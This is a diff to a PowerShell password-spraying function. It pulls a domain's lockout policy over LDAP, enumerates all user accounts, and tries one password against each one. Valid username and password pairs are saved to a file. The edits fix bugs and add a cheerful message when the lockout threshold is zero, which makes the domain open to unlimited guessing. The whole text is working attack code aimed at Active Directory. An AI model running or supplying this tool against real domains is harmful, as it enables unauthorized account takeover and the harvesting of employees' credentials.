@@ -3,7 +3,7 @@ function PasswordSpray {
     param(
         [string]$Domain, 
         [string]$Password,
-		[switch]$JustSecess
+		[switch]$Justsuccess
 		
     )
 
@@ -24,19 +24,18 @@ function PasswordSpray {
     }
 	
 	
-	    $hitsCsv = Join-Path $PWD "valid_hits.txt"
-   
-		if (-not (Test-Path $hitsCsv)) {
-			[pscustomobject]@{
-				SamAccountName = ''
-				Password       = ''
-				TimeUTC        = [datetime]::UtcNow
-			} | Select-Object SamAccountName,Password,TimeUTC |
-				Export-Csv -Path $hitsCsv -NoTypeInformation
+    $hitsCsv = Join-Path $PWD "valid_hits.txt"
+    if (Test-Path -LiteralPath $hitsCsv) { Remove-Item -LiteralPath $hitsCsv -Force -ErrorAction SilentlyContinue }
 
-			(Get-Content $hitsCsv | Select-Object -Skip 1) | Set-Content $hitsCsv
-		}
-	
+    if (-not (Test-Path $hitsCsv)) {
+        [pscustomobject]@{
+            SamAccountName = ''
+            Password       = ''
+            TimeUTC        = [datetime]::UtcNow
+        } | Select-Object SamAccountName,Password,TimeUTC | Export-Csv -Path $hitsCsv -NoTypeInformation
+        
+    }
+            
 
     Add-Type -AssemblyName System.DirectoryServices.AccountManagement
 
@@ -91,14 +90,19 @@ function PasswordSpray {
     }
 
     Write-Host "[+] Got Domain Password Policy :)" -ForegroundColor Yellow
-    Write-Host "	[*] Lockout Threshold            : $($PasswordPolicy.LockoutThreshold)" -ForegroundColor Cyan
+    if($($PasswordPolicy.LockoutThreshold) -eq "0"){
+        Write-Host "	[!] Lockout Threshold            : $($PasswordPolicy.LockoutThreshold) - Have Fun :)" -ForegroundColor Cyan
+    }
+    else{
+        Write-Host "	[*] Lockout Threshold            : $($PasswordPolicy.LockoutThreshold)" -ForegroundColor Cyan
+    }
     Write-Host "	[*] Lockout Observation Window   : $($PasswordPolicy.LockoutObservationWindowM) minutes" -ForegroundColor Cyan
     Write-Host "	[*] Lockout Duration             : $($PasswordPolicy.LockoutDurationM) minutes" -ForegroundColor Cyan
     Write-Host "	[*] Minimum Password Length      : $($PasswordPolicy.MinPasswordLength)" -ForegroundColor Cyan
     Write-Host "	[*] Maximum Password Age (days)  : $($PasswordPolicy.MaxPasswordAgeDays)" -ForegroundColor Cyan
     Write-Host "	[*] Minimum Password Age (days)  : $($PasswordPolicy.MinPasswordAgeDays)" -ForegroundColor Cyan
     Write-Host "	[*] Password History Length      : $($PasswordPolicy.PasswordHistoryLength)" -ForegroundColor Cyan
-    Write-Host "=========================================================================" -ForegroundColor Yellow
+    Write-Host "================================================" -ForegroundColor Yellow
 	Write-Host " "
 
     $entry    = New-Object DirectoryServices.DirectoryEntry("LDAP://$pdc/$domainDN")
@@ -109,7 +113,7 @@ function PasswordSpray {
     @("samAccountName","userAccountControl","memberOf","badPwdCount","badPasswordTime","pwdLastSet","lockoutTime") | ForEach-Object { [void]$searcher.PropertiesToLoad.Add($_) }
 
 	
-	Write-Host "[...]Query LDAP for getting all sam user accounts..." -ForegroundColor Yellow
+	Write-Host "[>] Query LDAP for getting all sam user accounts..." -ForegroundColor Yellow
     $results = $searcher.FindAll()
 
     $nowUtc = (Get-Date).ToUniversalTime()
@@ -159,7 +163,7 @@ function PasswordSpray {
         }
     }
 
-    Write-Host "[+] Number of Targets $($users.Count) User Accounts" -ForegroundColor Yellow
+    Write-Host "[+] Found $($users.Count) targeted user Accounts" -ForegroundColor Yellow
 	Write-Host "[+] Starting.." -ForegroundColor Yellow
 
     foreach ($u in $users) {
@@ -177,15 +181,16 @@ function PasswordSpray {
         $ok  = $Ctx.ValidateCredentials($u.SamAccountName, $Password, [System.DirectoryServices.AccountManagement.ContextOptions]::Negotiate)
 
         if ($ok) {
-            Write-Host "[+] Great! $($u.SamAccountName) :  $(password)" -ForegroundColor Green
-			[pscustomobject]@{
+            Write-Host "[+] Great! $($u.SamAccountName) :  $($password)" -ForegroundColor Green
+            [pscustomobject]@{
                 SamAccountName = $u.SamAccountName
                 Password       = $Password
                 TimeUTC        = (Get-Date).ToUniversalTime()
             } | Export-Csv -Path $hitsCsv -NoTypeInformation -Append
+
         
         } else {
-			if($JustSecess){
+			if($Justsuccess){
 				continue
 			}
 			else{
